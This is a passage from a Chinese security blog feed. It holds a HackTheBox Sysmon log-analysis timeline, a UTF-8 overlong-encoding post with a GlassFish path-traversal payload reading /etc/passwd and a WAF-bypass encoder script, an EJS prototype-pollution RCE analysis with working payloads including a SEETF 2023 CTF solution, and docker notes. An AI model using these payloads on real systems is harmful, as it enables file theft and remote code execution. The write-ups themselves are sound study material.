<p><img src="/article/Unit42-HackTheBox/image-20240422001612820.png"></p>
<h2 id="Task7"><a href="#Task7" class="headerlink" title="Task7"></a>Task7</h2><p><strong>恶意进程尝试访问哪个 IP 地址？</strong></p>
<p>还是继续顺着时间往后翻，找到目的ip为<code>93.184.216.34</code></p>
<p><img src="/article/Unit42-HackTheBox/image-20240422001731797.png"></p>
<h2 id="Task8"><a href="#Task8" class="headerlink" title="Task8"></a>Task8</h2><p><strong>该恶意进程在使用 UltraVNC 后门变体感染 PC 后自行终止。该进程何时终止？</strong></p>
<p>往后翻可以在事件5找到恶意进程</p>
<p><img src="/article/Unit42-HackTheBox/image-20240422002202572.png"></p>
<h2 id="时间线"><a href="#时间线" class="headerlink" title="时间线"></a>时间线</h2><table>
<thead>
<tr>
<th>Time (UTC)</th>
<th>Description</th>
<th>Reference</th>
</tr>
</thead>
<tbody><tr>
<td>2024-02-14T03:41:26.4</td>
<td>Firefox DNS 查询 Dropbox</td>
<td>DNS (22)</td>
</tr>
<tr>
<td>2024-02-14T03:41:26.5</td>
<td>火狐恶意软件下载</td>
<td>文件创建 (11)</td>
</tr>
<tr>
<td>2024-02-14T03:41:30.4</td>
<td>Windows 将恶意软件标记为已下载</td>
<td>文件创建 (11)</td>
</tr>
<tr>
<td>2024-02-14T03:41:45.8</td>
<td>Firefox DNS 查询 Dropbox</td>
<td>DNS (22)</td>
</tr>
<tr>
<td>2024-02-14T03:41:56.6</td>
<td><code>Preventivo24.02.14.exe.exe</code> 已启动</td>
<td>流程创建 (1)</td>
</tr>
<tr>
<td>2024-02-14T03:41:57.9</td>
<td>恶意软件启动 <code>msiexec</code></td>
<td>流程创建 (1)</td>
</tr>
<tr>
<td>2024-02-14T03:41:58.4</td>
<td>恶意软件将文件写入磁盘</td>
<td>文件创建 (11)</td>
</tr>
<tr>
<td>2024-02-14T03:41:58.4</td>
<td>恶意软件对 15 个文件进行时间戳记。</td>
<td>时间修改 (2)</td>
</tr>
<tr>
<td>2024-02-14T03:41:58.6</td>
<td>恶意软件连接到 93.184.216.34</td>
<td>Network (3)</td>
</tr>
<tr>
<td>2024-02-14T03:41:58.8</td>
<td><code>www.example.com</code> 的恶意软件 DNS 查询</td>
<td>DNS (22)</td>
</tr>
<tr>
<td>2024-02-14 03:41:58.8</td>
<td>恶意软件自行终止</td>
<td>进程终止 (5)</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>日志分析</category>
      </categories>
      <tags>
        <tag>HackTheBox</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>UTF-8 Overlong Encoding导致的安全问题</title>
    <url>/article/UTF-8-Overlong-Encoding%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98.html</url>
    <content><![CDATA[<p>GlassFish 任意文件读取漏洞、利用Overlong Encoding绕过java的waf</p>
<span id="more"></span>

<h1 id="UTF-8-Overlong-Encoding导致的安全问题"><a href="#UTF-8-Overlong-Encoding导致的安全问题" class="headerlink" title="UTF-8 Overlong Encoding导致的安全问题"></a>UTF-8 Overlong Encoding导致的安全问题</h1><p><a href="https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html">参考文章</a></p>
<h2 id="UTF-8编码原理"><a href="#UTF-8编码原理" class="headerlink" title="UTF-8编码原理"></a>UTF-8编码原理</h2><blockquote>
<p>UTF-8是现在最流行的编码方式，它可以将unicode码表里的所有字符，用某种计算方式转换成长度是1到4位字节的字符。</p>
</blockquote>
<p>参考这个表格，我们就可以很轻松地将不同区间的unicode码转换成UTF-8编码：</p>
<table>
<thead>
<tr>
<th align="center">First code point</th>
<th align="center">Last code point</th>
<th align="center">Byte 1</th>
<th align="center">Byte 2</th>
<th align="center">Byte 3</th>
<th align="center">Byte 4</th>
</tr>
</thead>
<tbody><tr>
<td align="center">U+0000</td>
<td align="center">U+007F</td>
<td align="center">0xxxxxxx</td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">U+0080</td>
<td align="center">U+07FF</td>
<td align="center">110xxxxx</td>
<td align="center">10xxxxxx</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">U+0800</td>
<td align="center">U+FFFF</td>
<td align="center">1110xxxx</td>
<td align="center">10xxxxxx</td>
<td align="center">10xxxxxx</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">U+10000</td>
<td align="center">U+10FFFF</td>
<td align="center">11110xxx</td>
<td align="center">10xxxxxx</td>
<td align="center">10xxxxxx</td>
<td align="center">10xxxxxx</td>
</tr>
</tbody></table>
<p>举个例子，欧元符号€的unicode编码是U+20AC，按照如下方法将其转换成UTF-8编码</p>
<ol>
<li><p>首先，因为<code>U+20AC</code>是位于<code>U+0800</code>和<code>U+FFFF</code>之间的，所以由上图可知其UTF-8编码长度为3</p>
</li>
<li><p><code>U+20AC</code>的二进制表示为<code>10 0000 1010 1100</code>，将其从右到左分成4，6，6三组(第一组长度不足4要补0)就变成<code>0010 000010 101100</code>。</p>
</li>
<li><p>按照图表中的编码方式，分别在三组添加前缀后结果为<code>11100010 10000010 10101100</code>，对应的就是<code>\xE2\x82\xAC</code></p>
<p><img src="/article/UTF-8-Overlong-Encoding%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20240331111429771.png"></p>
</li>
<li><p>而<code>\xE2\x82\xAC</code>即为欧元符号<code>€</code>的UTF-8编码</p>
</li>
</ol>
<h2 id="Overlong-Encoding造成什么问题"><a href="#Overlong-Encoding造成什么问题" class="headerlink" title="Overlong Encoding造成什么问题"></a>Overlong Encoding造成什么问题</h2><blockquote>
<p>Overlong Encoding就是将1个字节的字符，按照UTF-8编码方式强行编码成2位以上UTF-8字符的方法。</p>
</blockquote>
<p>举个例子，点号<code>.</code>的Unicode编码和ascii编码一致，均为<code>0x2E</code>。按照上表它只能被编码成单字节的UTF-8字符，但是如果按照下面方式去转换：</p>
<ol>
<li><code>0x2E</code>的二进制为<code>10 1110</code>，在前面补5个0变成<code>00000101110</code></li>
<li>将其分成5位、6位两组：<code>00000</code>，<code>101110</code></li>
<li>按照在<code>U+0080</code>到<code>U+07FF</code>区间编码方式，分别给这两组增加前缀<code>110</code>，<code>10</code>，结果是<code>11000000</code>，<code>10101110</code>，对应的是<code>\xC0\xAE</code></li>
</ol>
<p><code>0xC0AE</code>并不是一个合法的UTF-8字符，但我们确实是按照UTF-8编码方式将其转换出来的，这就是UTF-8设计中的一个缺陷。按照UTF-8的规范来说，我们应该使用字符可以对应的最小字节数来表示这个字符。那么对于点号来说，就应该是0x2e。但UTF-8编码转换的过程中，并没有限制往前补0，导致转换出了非法的UTF-8字符。</p>
<p><strong>这种攻击方式就叫“Overlong Encoding”。</strong></p>
<p>很多语言都对此攻击方式做出限制，如python想将<code>0xC0AE</code>转换成点号，就会抛出异常</p>
<p><img src="/article/UTF-8-Overlong-Encoding%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20240331112900764.png"></p>
<p>而在java中很多地方却并没有对其进行防御，因此导致安全漏洞。</p>
<h2 id="GlassFish-任意文件读取漏洞"><a href="#GlassFish-任意文件读取漏洞" class="headerlink" title="GlassFish 任意文件读取漏洞"></a>GlassFish 任意文件读取漏洞</h2><blockquote>
<p>GlassFish在解码URL时，没有考虑UTF-8 Overlong Encoding攻击，导致将<code>%c0%ae</code>解析为ASCCII字符的<code>.</code>（点）。利用<code>%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/</code>来向上跳转，达到目录穿越、任意文件读取的效果。</p>
</blockquote>
<p>我们用<a href="https://github.com/vulhub/vulhub/tree/master">vulhub</a>的靶场复现一下</p>
<p>这个漏洞就是在URL中使用<code>%C0%AE</code>来代替点号<code>.</code>，绕过目录穿越的限制，导致任意文件读取</p>
<p>payload如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd</span><br></pre></td></tr></table></figure>

<p>可以发现成功读取<code>/etc/passwd</code></p>
<p><img src="/article/UTF-8-Overlong-Encoding%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20240331113329452.png"></p>
<h2 id="利用Overlong-Encoding绕过WAF"><a href="#利用Overlong-Encoding绕过WAF" class="headerlink" title="利用Overlong Encoding绕过WAF"></a>利用Overlong Encoding绕过WAF</h2><p><strong>绕过原理</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Java在反序列化时使用ObjectInputStream类，这个类实现了DataInput接口，这个接口定义了读取字符串的方法readUTF。在解码中，Java实际实现的是一个魔改过的UTF-8编码，名为“Modified UTF-8”(只使用三个字节来表示)。并且其三字节以内的转换过程是和UTF-8相同的，所以仍然继承了“Overlong Encoding”缺陷。</span><br></pre></td></tr></table></figure>

<p>将ASCII字符串转换成Overlong Encoding的UTF-8编码，python脚本如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def convert_int(i: int) -&gt; bytes:</span><br><span class="line">    b1 = ((i &gt;&gt; 6) &amp; 0b11111) | 0b11000000</span><br><span class="line">    b2 = (i &amp; 0b111111) | 0b10000000</span><br><span class="line">    return bytes([b1, b2])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def convert_str(s: str) -&gt; bytes:</span><br><span class="line">    bs = b&#x27;&#x27;</span><br><span class="line">    for ch in s.encode():</span><br><span class="line">        bs += convert_int(ch)</span><br><span class="line">	</span><br><span class="line">	return bs</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    print(convert_str(&#x27;.&#x27;)) # b&#x27;\xc0\xae&#x27;</span><br><span class="line">    print(convert_str(&#x27;org.example.Evil&#x27;)) # b&#x27;\xc1\xaf\xc1\xb2\xc1\xa7\xc0\xae\xc1\xa5\xc1\xb8\xc1\xa1\xc1\xad\xc1\xb0\xc1\xac\xc1\xa5\xc0\xae\xc1\x85\xc1\xb6\xc1\xa9\xc1\xac&#x27;</span><br></pre></td></tr></table></figure>

<p>运行结果如下</p>
<p><img src="/article/UTF-8-Overlong-Encoding%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20240331113844349.png"></p>
<p>总结一下，在java环境下可以利用Overlong Encoding绕过waf的限制，使得我们可以执行恶意代码。</p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>ejs默认配置之原型链污染</title>
    <url>/article/ejs%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93.html</url>
    <content><![CDATA[<p>ejs默认配置造成原型链污染</p>
<span id="more"></span>

<h1 id="ejs默认配置之原型链污染"><a href="#ejs默认配置之原型链污染" class="headerlink" title="ejs默认配置之原型链污染"></a>ejs默认配置之原型链污染</h1><p><a href="https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce#sspp_gadget">参考文章</a></p>
<h2 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h2><p>EJS维护者对原型链污染的问题有着很好的理解，并使用非常安全的函数清理他们创建的每个对象</p>
<p>利用<code>Render()</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exports.render = function (template, d, o) &#123;</span><br><span class="line">    var data = d || utils.createNullProtoObjWherePossible();</span><br><span class="line">    var opts = o || utils.createNullProtoObjWherePossible();</span><br><span class="line"></span><br><span class="line">    // No options object -- if there are optiony names</span><br><span class="line">    // in the data, copy them to options</span><br><span class="line">    if (arguments.length == 2) &#123;</span><br><span class="line">        utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return handleCache(opts, template)(data);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>以及<code>createNullProtoObjWherePossible()</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exports.createNullProtoObjWherePossible = (function () &#123;</span><br><span class="line">    if (typeof Object.create == &#x27;function&#x27;) &#123;</span><br><span class="line">        return function () &#123;</span><br><span class="line">            return Object.create(null);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!(&#123;__proto__: null&#125; instanceof Object)) &#123;</span><br><span class="line">        return function () &#123;</span><br><span class="line">            return &#123;__proto__: null&#125;;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Not possible, just pass through</span><br><span class="line">    return function () &#123;</span><br><span class="line">        return &#123;&#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<blockquote>
<p>参考文章是这么说的，分析上述代码，可以知道不能滥用原型链污染库内新创建的对象。因此，对于用户提供的对象来说情况并非如此，从 EJS 维护者的角度来看，用户向库提供的输入不是 EJS 的责任。</p>
</blockquote>
<p>如何理解呢，就是说我们提供的可以被污染的对象并不会遭到上述函数清理。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>渲染模板时ejs 动态创建函数，该函数将使用<strong>传递给它的数据</strong>组装模板。该函数是根据模板动态创建的字符串编译的。所有这些都发生在最终被调用的 Template 类的编译函数中，在这种情况下，当创建模板对象时，将使用受感染的选项。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exports.compile = function compile(template, opts) &#123;</span><br><span class="line">    var templ;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    templ = new Template(template, opts);</span><br><span class="line">    return templ.compile();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>现在我们知道可以控制配置对象的原型后，那么就可以进一步利用</p>
<p><img src="/article/ejs%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20240106161658664.png"></p>
<p>我们已经知道当编译模板时，它会使用多个配置元素来处理模板中的代码片段，并将其转换为可执行的 JavaScript 函数。这些配置元素可能包括模板标签、控制流语句、输出语句等。不过其中大多数都使用<code>_JS_IDENTIFIER</code> 正则表达式进行清理</p>
<p><img src="/article/ejs%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20240106162305462.png"></p>
<p>但是并不意味着所有都会被正则清理，我们看向下面代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">compile: function () &#123;</span><br><span class="line">    /** @type &#123;string&#125; */</span><br><span class="line">    var src;</span><br><span class="line">    /** @type &#123;ClientFunction&#125; */</span><br><span class="line">    var fn;</span><br><span class="line">    var opts = this.opts;</span><br><span class="line">    var prepended = &#x27;&#x27;;</span><br><span class="line">    var appended = &#x27;&#x27;;</span><br><span class="line">    /** @type &#123;EscapeCallback&#125; */</span><br><span class="line">    var escapeFn = opts.escapeFunction;</span><br><span class="line">    /** @type &#123;FunctionConstructor&#125; */</span><br><span class="line">    var ctor;</span><br><span class="line">    /** @type &#123;string&#125; */</span><br><span class="line">    var sanitizedFilename = opts.filename ? JSON.stringify(opts.filename) : &#x27;undefined&#x27;;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    if (opts.client) &#123;</span><br><span class="line">      src = &#x27;escapeFn = escapeFn || &#x27; + escapeFn.toString() + &#x27;;&#x27; + &#x27;\n&#x27; + src;</span><br><span class="line">      if (opts.compileDebug) &#123;</span><br><span class="line">        src = &#x27;rethrow = rethrow || &#x27; + rethrow.toString() + &#x27;;&#x27; + &#x27;\n&#x27; + src;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    return returnedFn;</span><br></pre></td></tr></table></figure>

<p>我们可以知道将<code>opts.escapeFunction</code>赋值给<code>escapeFn</code>，如果<code>opts.client</code>存在，那么<code>escapeFn</code>就会在函数体内从而被调用</p>
<p>由于 opts.client 和 opts.escapeFunction 默认情况下未设置，因此可以原型链污染它们到达eval接收器并实现RCE</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;__proto__&quot;: &#123;</span><br><span class="line">        &quot;client&quot;: 1,</span><br><span class="line">        &quot;escapeFunction&quot;: &quot;JSON.stringify; process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;)&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Setup app</span><br><span class="line">const express = require(&quot;express&quot;);</span><br><span class="line">const app  = express();</span><br><span class="line">const port = 3000;</span><br><span class="line"></span><br><span class="line">// Select ejs templating library</span><br><span class="line">app.set(&#x27;view engine&#x27;, &#x27;ejs&#x27;);</span><br><span class="line"></span><br><span class="line">// Routes</span><br><span class="line">app.get(&quot;/&quot;, (req, res) =&gt; &#123;</span><br><span class="line">    res.render(&quot;index&quot;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(&quot;/vuln&quot;, (req, res) =&gt; &#123;</span><br><span class="line">    // simulate SSPP vulnerability</span><br><span class="line">    var a = req.query.a;</span><br><span class="line">    var b = req.query.b;</span><br><span class="line">    var c = req.query.c;</span><br><span class="line"></span><br><span class="line">    var obj = &#123;&#125;;</span><br><span class="line">    obj[a][b] = c;</span><br><span class="line"></span><br><span class="line">    res.send(&quot;OK!&quot;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">// Start app</span><br><span class="line">app.listen(port, () =&gt; &#123;</span><br><span class="line">    console.log(`App listening on port $&#123;port&#125;`)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>GET传参payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一次: /vuln?a=__proto__&amp;b=escapeFunction&amp;c=JSON.stringify; process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;)</span><br><span class="line">第二次: /vuln?a=__proto__&amp;b=client&amp;c=true</span><br></pre></td></tr></table></figure>

<p><img src="/article/ejs%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20240106163117582.png"></p>
<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><p><strong>[SEETF 2023]Express JavaScript Security</strong></p>
<p>源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const express = require(&#x27;express&#x27;);</span><br><span class="line">const ejs = require(&#x27;ejs&#x27;);</span><br><span class="line"></span><br><span class="line">const app = express();</span><br><span class="line"></span><br><span class="line">app.set(&#x27;view engine&#x27;, &#x27;ejs&#x27;);</span><br><span class="line"></span><br><span class="line">const BLACKLIST = [</span><br><span class="line">    &quot;outputFunctionName&quot;,</span><br><span class="line">    &quot;escapeFunction&quot;,</span><br><span class="line">    &quot;localsName&quot;,</span><br><span class="line">    &quot;destructuredLocals&quot;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    return res.render(&#x27;index&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/greet&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    </span><br><span class="line">    const data = JSON.stringify(req.query);</span><br><span class="line"></span><br><span class="line">    if (BLACKLIST.find((item) =&gt; data.includes(item))) &#123;</span><br><span class="line">        return res.status(400).send(&#x27;Can you not?&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return res.render(&#x27;greet&#x27;, &#123;</span><br><span class="line">        ...JSON.parse(data),</span><br><span class="line">        cache: false</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(3000, () =&gt; &#123;</span><br><span class="line">    console.log(&#x27;Server listening on port 3000&#x27;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>分析一下，<code>app.set(&#39;view engine&#39;, &#39;ejs&#39;);</code>说明ejs模板是默认配置，在<code>/greet</code>路由下，接收GET参数并赋值给data变量，然后黑名单检测，调用ejs模板进行渲染其中解析data的json数据，说明ejs配置可控。</p>
<p>我们前文利用的payload是有escapeFunction关键字的，并且污染的过程是我们手动添加<code>/vuln</code>上去的，所以我们要寻找可以利用的地方</p>
<p>通常情况下，ejs模板只允许在数据对象中传递以下相对无害的选项</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var _OPTS_PASSABLE_WITH_DATA = [&#x27;delimiter&#x27;, &#x27;scope&#x27;, &#x27;context&#x27;, &#x27;debug&#x27;, &#x27;compileDebug&#x27;,</span><br><span class="line">  &#x27;client&#x27;, &#x27;_with&#x27;, &#x27;rmWhitespace&#x27;, &#x27;strict&#x27;, &#x27;filename&#x27;, &#x27;async&#x27;];</span><br><span class="line">// We don&#x27;t allow &#x27;cache&#x27; option to be passed in the data obj for</span><br><span class="line">// the normal `render` call, but this is where Express 2 &amp; 3 put it</span><br><span class="line">// so we make an exception for `renderFile`</span><br><span class="line">var _OPTS_PASSABLE_WITH_DATA_EXPRESS = _OPTS_PASSABLE_WITH_DATA.concat(&#x27;cache&#x27;);</span><br></pre></td></tr></table></figure>

<p>但是我们找到<code>settings[&#39;view options&#39;]</code>可用于将任意选项传递给EJS，这将是我们利用的点</p>
<p>跟进一下，会调用shallowCopy()进行赋值给opts</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">viewOpts = data.settings[&#x27;view options&#x27;];</span><br><span class="line">if (viewOpts) &#123;</span><br><span class="line">  utils.shallowCopy(opts, viewOpts);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而在渲染模板的时候会跟进到Template类中，发现关键语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">options.escapeFunction = opts.escape || opts.escapeFunction || utils.escapeXML;</span><br></pre></td></tr></table></figure>

<p>也就是说虽然escapeFunction被过滤了，但是我们可以利用opts.escape去替换</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">settings[&#x27;view options&#x27;][escape]=...</span><br></pre></td></tr></table></figure>

<p>将前文漏洞利用的payload稍加修改一下，然后添加上greet.ejs中的三个配置参数</p>
<p><img src="/article/ejs%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20240106171750370.png"></p>
<p>得到最终payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/greet?name=test&amp;font=test&amp;fontSize=test&amp;settings[view options][escape]=function()&#123;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;/readflag&#x27;)&#125;&amp;settings[view options][client]=1</span><br></pre></td></tr></table></figure>

<p>注：题目源码已经<code>JSON.stringify</code>了，<code>/readflag</code>可以在dockerfile中得到信息</p>
<p><img src="/article/ejs%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20240106175700268.png"></p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>模板注入</tag>
        <tag>原型链污染</tag>
      </tags>
  </entry>
  <entry>
    <title>docker</title>
    <url>/article/docker.html</url>
    <content><![CDATA[<p>docker搭建环境的基本命令</p>
<span id="more"></span>

<h1 id="docker部署"><a href="#docker部署" class="headerlink" title="docker部署"></a>docker部署</h1><p>启动docker</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service docker start</span><br></pre></td></tr></table></figure>

<p>首先在题目附件中带有dockerfile的目录打开终端，如</p>
<p><img src="/article/docker/image-20231126144440949.png"></p>
<p>然后输入下面命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker build -t paywall .</span><br></pre></td></tr></table></figure>

<p>接着查看是否启动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>

<p><img src="/article/docker/image-20231126144606567.png"></p>
<p>然后创建</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -i -d -P paywall</span><br></pre></td></tr></table></figure>

<p>ps查看，发现成功</p>
<p><img src="/article/docker/image-20231126144706256.png"></p>
<p><strong>注意dockerfile的文件路径是否正确</strong></p>
<p>复现完题目后，先删除容器再删除镜像，依次执行如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker stop 578677ecd7e9</span><br><span class="line">docker rm 578677ecd7e9</span><br><span class="line">docker rmi ezrce</span><br></pre></td></tr></table></figure>









<h2 id="容器使用"><a href="#容器使用" class="headerlink" title="容器使用"></a>容器使用</h2><p>如果我们本地没有 ubuntu 镜像，我们可以使用 docker pull 命令来载入 ubuntu 镜像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull ubuntu</span><br></pre></td></tr></table></figure>

<p>参数说明：</p>
<ul>
<li><strong>-i</strong>: 交互式操作。</li>
<li><strong>-t</strong>: 终端。</li>
<li><strong>ubuntu</strong>: ubuntu 镜像。</li>
<li><strong>&#x2F;bin&#x2F;bash</strong>：放在镜像名后的是命令，这里我们希望有个交互式 Shell，因此用的是 &#x2F;bin&#x2F;bash。</li>
</ul>
<p><img src="/article/docker/image-20230904231622958.png"></p>
<p>如果退出终端，直接输入 exit</p>
<p>查看所有的容器命令如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>

<p><img src="/article/docker/image-20230904231912177.png"></p>
<p>启动一个已停止的容器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ docker start 7f840622fe25</span><br></pre></td></tr></table></figure>

<p><img src="/article/docker/image-20230904233049365.png"></p>
<p>停止容器的命令如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker stop 7f840622fe25</span><br></pre></td></tr></table></figure>



<h2 id="exec-命令"><a href="#exec-命令" class="headerlink" title="exec 命令"></a>exec 命令</h2><p>下面演示了使用 docker exec 命令。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec -it 7f840622fe25 /bin/bash</span><br></pre></td></tr></table></figure>

<p><img src="/article/docker/image-20230904233037481.png"></p>
<h2 id="cp命令"><a href="#cp命令" class="headerlink" title="cp命令"></a>cp命令</h2><p>将主机&#x2F;www&#x2F;runoob目录拷贝到容器96f7f14e99ab的&#x2F;www目录下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker cp /www/runoob 96f7f14e99ab:/www/</span><br></pre></td></tr></table></figure>

<p>将主机&#x2F;www&#x2F;runoob目录拷贝到容器96f7f14e99ab中，目录重命名为www。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker cp /www/runoob 96f7f14e99ab:/www</span><br></pre></td></tr></table></figure>

<p>将容器96f7f14e99ab的&#x2F;www目录拷贝到主机的&#x2F;tmp目录中。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker cp  96f7f14e99ab:/www /tmp/</span><br></pre></td></tr></table></figure>



<h1 id="docker-compose部署"><a href="#docker-compose部署" class="headerlink" title="docker-compose部署"></a>docker-compose部署</h1><p>主要用于vulhub靶场搭建，进入到漏洞目录对靶场进行编译</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br></pre></td></tr></table></figure>

<p>然后运行此靶场</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>查看启动环境</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose ps -a</span><br></pre></td></tr></table></figure>

<p>关闭靶场环境</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose down</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>杂项</category>
      </categories>
  </entry>
  <entry>
    <title>pgAdmin命令执行漏洞</title>
    <url>/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html</url>
    <content><![CDATA[<p>注意到p神在paper发的一篇跟pgAdmin命令执行漏洞有关的文章，所以利用vulhub靶场环境复现一下</p>
<span id="more"></span>

<h1 id="pgAdmin命令执行漏洞"><a href="#pgAdmin命令执行漏洞" class="headerlink" title="pgAdmin命令执行漏洞"></a>pgAdmin命令执行漏洞</h1><p><a href="https://paper.seebug.org/3144/#2-cve-2023-5002pgadmin-76">参考文章</a></p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
